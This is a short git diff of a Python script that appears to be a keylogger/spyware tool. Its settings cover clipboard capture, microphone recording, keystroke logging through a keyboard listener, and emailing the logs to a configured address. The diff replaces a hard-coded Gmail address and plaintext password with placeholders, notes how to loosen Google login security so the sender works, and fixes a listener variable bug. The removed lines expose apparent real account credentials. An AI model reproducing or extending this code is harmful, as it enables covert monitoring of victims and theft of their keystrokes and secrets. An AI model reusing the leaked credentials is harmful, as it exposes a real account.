@@ -38,9 +38,9 @@ clipboardinfo_enc   = "clipboard_enc.txt"
 key             = "DbMMQtBeJvVtB-QU21FCLpVuDyTxWEEPPdxYum4PSzs="
 
 #Email Info
-email       = "shellhawk.ml@gmail.com"
-password    = "#Hijicklol047" # Make sure you enable the "less secure apps feature in account settings to make google allow this login."
-toaddress   = "shellhawk.ml@gmail.com"
+email       = "YOUR MAIL"
+password    = "YOUR PASSWORD" # Make sure you enable the "less secure apps feature in account settings to make google allow this login."
+toaddress   = "TARGET EMAIL ADDRESS"
 
 #Controls
 mic_time             = 10
@@ -158,8 +158,8 @@ while no_of_iterations < no_of_iterations_end:
         if currentTime > stoppingTime:
             return False
 
-    with Listener(on_press=on_press, on_release=on_release) as Listener:
-        Listener.join()
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
     if currentTime > stoppingTime:
         with open(keypath+extend+keylogs, 'w') as file:
